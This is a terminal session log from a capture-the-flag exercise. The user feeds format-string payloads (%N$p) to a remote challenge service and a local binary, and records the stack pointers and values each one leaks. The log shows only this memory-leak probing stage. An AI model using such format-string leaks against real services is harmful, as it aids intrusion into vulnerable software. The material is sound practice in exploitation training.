@@ -1,0 +1,246 @@
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001  
+Welcome
+What's your name?
+%91$p %78$p %79$p
+Hi, 0x6afd26 0xbfc8ded8 0x45f8f1
+Here is Despair Town...
+
+What's your name?
+%91$p %78$p %79$p
+Hi, 0x6afd26 0xbfc8ded8 0x45f8f1
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%91$p %78$p %79$p
+Hi, 0x44fd26 0xbf892ce8 0x4368f1
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < 
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) <   
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < ./villager 
+Welcome
+What's your name?
+%91$p %78$p %79$p                                                                              
+Hi, 0xf7c20637 0xffffbca8 0x565558f1
+Here is Despair Town...
+
+^C
+~/ctf/ksnctf-work/VillagerB:yyy@(๑˃̵ᴗ˂̵)ﻭ < 
+~/ctf/ksnctf-work/VillagerB:yyy@(๑˃̵ᴗ˂̵)ﻭ < 
+~/ctf/ksnctf-work/VillagerB:yyy@(๑˃̵ᴗ˂̵)ﻭ < python -c 'print "%p, %2p, %3p, %4p, %5p, %6p, %7p, %8p, %9p, %10p"'
+%p, %2p, %3p, %4p, %5p, %6p, %7p, %8p, %9p, %10p
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%p, %2p, %3p, %4p, %5p, %6p, %7p, %8p, %9p, %10p
+Hi, 0x100, 0x3048c0, (nil), 0xb77045d0,   0x1,  (nil), 0x202c7025, 0x2c703225, 0x70332520, 0x3425202c
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < python -c 'print "%11p, %12p, %13p, %14p, %15p, %16p, %17p, %18p, %19p, %20p"'                   
+%11p, %12p, %13p, %14p, %15p, %16p, %17p, %18p, %19p, %20p
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%11p, %12p, %13p, %14p, %15p, %16p, %17p, %18p, %19p, %20p
+Hi,       0x100,     0x5748c0,         (nil),     0xb77285d0,             0x1,            (nil),        0x70313125,         0x3125202c,          0x202c7032,           0x70333125
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < ./villager 
+Welcome
+What's your name?
+%11p, %12p, %13p, %14p, %15p, %16p, %17p, %18p, %19p, %20p
+Hi,       0x100,   0xf7dba5a0,           0xe,         0x2190,             0x1,            0x3e8,        0x70313125,         0x3125202c,          0x202c7032,           0x70333125
+Here is Despair Town...
+
+^C
+~/ctf/ksnctf-work/VillagerB:yyy@(๑˃̵ᴗ˂̵)ﻭ < 
+~/ctf/ksnctf-work/VillagerB:yyy@(๑˃̵ᴗ˂̵)ﻭ < 
+~/ctf/ksnctf-work/VillagerB:yyy@(๑˃̵ᴗ˂̵)ﻭ < python -c 'print "%11$p, %12$p, %13$p, %14$p, %15$p, %16$p, %17$p, %18$p, %19$p, %20$p"'
+%11$p, %12$p, %13$p, %14$p, %15$p, %16$p, %17$p, %18$p, %19$p, %20$p
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < python -c 'print "%11$p, %12$p, %13$p, %14$p, %15$p, %16$p, %17$p, %18$p, %19$p, %20$p"' |pbcopy
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < ./villager 
+Welcome
+What's your name?
+%11$p, %12$p, %13$p, %14$p, %15$p, %16$p, %17$p, %18$p, %19$p, %20$p
+Hi, 0x2c702433, 0x34312520, 0x202c7024, 0x24353125, 0x25202c70, 0x70243631, 0x3125202c, 0x2c702437, 0x38312520, 0x202c7024
+Here is Despair Town...
+
+
+^C
+~/ctf/ksnctf-work/VillagerB:yyy@(๑˃̵ᴗ˂̵)ﻭ < 
+~/ctf/ksnctf-work/VillagerB:yyy@(๑˃̵ᴗ˂̵)ﻭ < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%11$p, %12$p, %13$p, %14$p, %15$p, %16$p, %17$p, %18$p, %19$p, %20$p
+Hi, 0x2c702433, 0x34312520, 0x202c7024, 0x24353125, 0x25202c70, 0x70243631, 0x3125202c, 0x2c702437, 0x38312520, 0x202c7024
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%22$p %23$p %24$p %25$p %26$p %27$p %28$p %29$p %30$p
+Hi, (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x291f (nil)
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < ./villager 
+Welcome
+What's your name?
+%22$p %23$p %24$p %25$p %26$p %27$p %28$p %29$p %30$p
+Hi, 0x8 (nil) 0xf7ffd4e4 0xf7fd31b8 0xf7c658c9 0xf7dbad60 0xa 0x5655ca10 0xffffbc78
+Here is Despair Town...
+
+^C
+~/ctf/ksnctf-work/VillagerB:yyy@(๑˃̵ᴗ˂̵)ﻭ < python -c 'print "%31$p %32$p %33$p %34$p %35$p %36$p %37$p %38$p %39$p %40$p"' |pbcopy
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%31$p %32$p %33$p %34$p %35$p %36$p %37$p %38$p %39$p %40$p
+Hi, 0x2f5ff4 0x2f6960 0x1cfa64 0xbfac36a8 0x1d013d 0x2f6960 0x1d1003 0xbfac36e8 0x2f5ff4 0x2f6960
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%78$p %79$p %80$p %81$p %82$p %83$p
+Hi, 0xbf942c78 0xa2b8f1 0x3 (nil) (nil) 0x328ff4
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < python -c 'print "%83$p %84$p %85$p %86$p %87$p %88$p %89$p %90$p %91$p"' |pbcopy
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%83$p %84$p %85$p %86$p %87$p %88$p %89$p %90$p %91$p
+Hi, 0x3d7ff4 0x40a940 0x40a6e0 0x40a94b 0xec54d7dc 0x40a940 (nil) 0xbfde10a8 0x25ad26
+Here is Despair Town...
+
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < python -c 'print "%83$p %84$p %85$p %86$p %87$p %88$p %89$p %90$p %91$p %92$p %93$p %94$p"' |pbcopy
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%83$p %84$p %85$p %86$p %87$p %88$p %89$p %90$p %91$p %92$p %93$p %94$p
+Hi, 0x837ff4 0xfcf940 0xfcf6e0 0xfcf94b 0x39881a80 0xfcf940 (nil) 0xbfb87758 0x6bad26 0x1 0xbfb87784 0xbfb8778c
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%78$p %79$p %80$p %81$p %82$p %83$p
+Hi, 0xbf92b748 0x27e8f1 0x3 (nil) (nil) 0x446ff4
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < python -c 'print "%63$p %64$p %65$p %66$p %67$p %68$p %69$p %70$p %71$p %72$p %73$p %74$p %75$p %76$p %77$p %78$p 79$p"' |pbcopy
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%63$p %64$p %65$p %66$p %67$p %68$p %69$p %70$p %71$p %72$p %73$p %74$p %75$p %76$p %77$p %78$p 79$p
+Hi, (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x677f7083 (nil) 0x3 (nil) 0xe9aff4 (nil) (nil) 0xbff3ca28 79$p
+Here is Despair Town...
+
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < python -c 'print "%63$p %64$p %65$p %66$p %67$p %68$p %69$p %70$p %71$p %72$p %73$p %74$p %75$p %76$p %77$p %78$p %79$p"' |pbcopy
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%63$p %64$p %65$p %66$p %67$p %68$p %69$p %70$p %71$p %72$p %73$p %74$p %75$p %76$p %77$p %78$p %79$p
+Hi, (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0xf01b5d5 (nil) 0x3 (nil) 0xebeff4 (nil) (nil) 0xbfa4e268 0xb3e8f1
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < 
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < python -c 'print "%73$p %74$p %75$p %76$p %77$p %78$p %79$p %80$p %81$p %82$p %83$p"' |pbcopy
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%73$p %74$p %75$p %76$p %77$p %78$p %79$p %80$p %81$p %82$p %83$p
+Hi, 0x3 (nil) 0x3c3ff4 (nil) (nil) 0xbffe1e58 0x8198f1 0x3 (nil) (nil) 0x3c3ff4
+Here is Despair Town...
+
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < python -c 'print "%66$p %67$p %68$p %69$p %70$p %71$p %72$p %73$p %74$p %75$p %76$p %77$p %78$p %79$p %80$p %81$p %82$p %83$p"' |pbcopy 
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%66$p %67$p %68$p %69$p %70$p %71$p %72$p %73$p %74$p %75$p %76$p %77$p %78$p %79$p %80$p %81$p %82$p %83$p
+Hi, (nil) (nil) (nil) (nil) (nil) 0xca0813b8 (nil) 0x3 (nil) 0x437ff4 (nil) (nil) 0xbfbb28d8 0x2a18f1 0x3 (nil) (nil) 0x437ff4
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < 
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < python -c 'print "%60$p %61$p %62$p %63$p %64$p %65$p %66$p %67$p %68$p %69$p %70$p %71$p %72$p %73$p %74$p %75$p %76$p %77$p %78$p %79$p %80$p %81$p %82$p %83$p"' |pbcopy
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%60$p %61$p %62$p %63$p %64$p %65$p %66$p %67$p %68$p %69$p %70$p %71$p %72$p %73$p %74$p %75$p %76$p %77$p %78$p %79$p %80$p %81$p %82$p %83$p
+Hi, (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x627092d8 (nil) 0x3 (nil) 0x313ff4 (nil) (nil) 0xbf9baec8 0x6c18f1 0x3 (nil) (nil) 0x313ff4
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < 
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < 
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) <   
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < python -c 'print "%38$p %39$p %40$p %41$p %42$p %43$p %44$p %45$p %46$p %47$p %48$p %49$p %50$p %51$p %52$p %53$p %54$p %55$p %56$p %57$p %58$p %59$p %60$p"' |pbcopy
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%38$p %39$p %40$p %41$p %42$p %43$p %44$p %45$p %46$p %47$p %48$p %49$p %50$p %51$p %52$p %53$p %54$p %55$p %56$p %57$p %58$p %59$p %60$p
+Hi, 0x35252070 0x20702439 0x24303625 0xa70 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil)
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < 
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%83$p %84$p %85$p %86$p %87$p %88$p %89$p %90$p %91$p %92$p %93$p %94$p
+Hi, 0x4b5ff4 0x8e9940 0x8e96e0 0x8e994b 0x5d743b8f 0x8e9940 (nil) 0xbf8fd798 0x338d26 0x1 0xbf8fd7c4 0xbf8fd7cc
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < 
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < Hi, 0x837ff4 0xfcf940 0xfcf6e0 0xfcf94b 0x39881a80 0xfcf940 (nil) 0xbfb87758 0x6bad26 0x1 0xbfb87784 0xbfb8778c
+zsh: unknown file attribute: i
+~/ctf/ksnctf-work/VillagerB:yyy@(๑˃̵ᴗ˂̵)ﻭ < vim memo     
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < 
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < 
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < 
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < python -c 'print "%77$p %78$p %79$p %80$p %81$p %82$p %83$p %84$p %85$p %86$p %87$p %88$p %89$p %90$p %91$p %92$p %93$p %94$p"' |pbcopy
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%77$p %78$p %79$p %80$p %81$p %82$p %83$p %84$p %85$p %86$p %87$p %88$p %89$p %90$p %91$p %92$p %93$p %94$p
+Hi, (nil) 0xbfb9fc48 0x3b68f1 0x3 (nil) (nil) 0x384ff4 0x3b6940 0x3b66e0 0x3b694b 0xe45521b9 0x3b6940 (nil) 0xbfb9fcc8 0x207d26 0x1 0xbfb9fcf4 0xbfb9fcfc
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < 
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < 
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%29$p %30$p %31$p
+Hi, 0x2efd (nil) 0x5c1ff4
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < %79$p %91$p %117$p %119$p
+fg: %79: no such job
+~/ctf/ksnctf-work/VillagerB:yyy@(๑˃̵ᴗ˂̵)ﻭ < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%79$p %91$p %117$p %119$p
+Hi, 0xc0d8f1 0x20cd26 0xbfeebca4 0xc0efbc
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < 
+~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < 0xc0d8f1
+~/ctf/ksnctf-work/VillagerB:yyy@(๑˃̵ᴗ˂̵)ﻭ < 
+~/ctf/ksnctf-work/VillagerB:yyy@(๑˃̵ᴗ˂̵)ﻭ < 
+~/ctf/ksnctf-work/VillagerB:yyy@(๑˃̵ᴗ˂̵)ﻭ < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%79$p %91$p %117$p %119$p %120$p
+Hi, 0x8b18f1 0x55cd26 0xbfd8ae04 0x8b2fbc 0x1
+Here is Despair Town...
+
+^C%                                                                                                               ~/ctf/ksnctf-work/VillagerB:yyy@(*｡˃̵ω ˂̵｡) < nc ctfq.sweetduet.info 10001
+Welcome
+What's your name?
+%79$p %91$p %117$p %119$p %120$p %121$p %122$p
+Hi, 0x3e78f1 0x14bd26 0xbf9e5944 0x3e8fbc 0x1 0x3e76e0 (nil)
+Here is Despair Town...
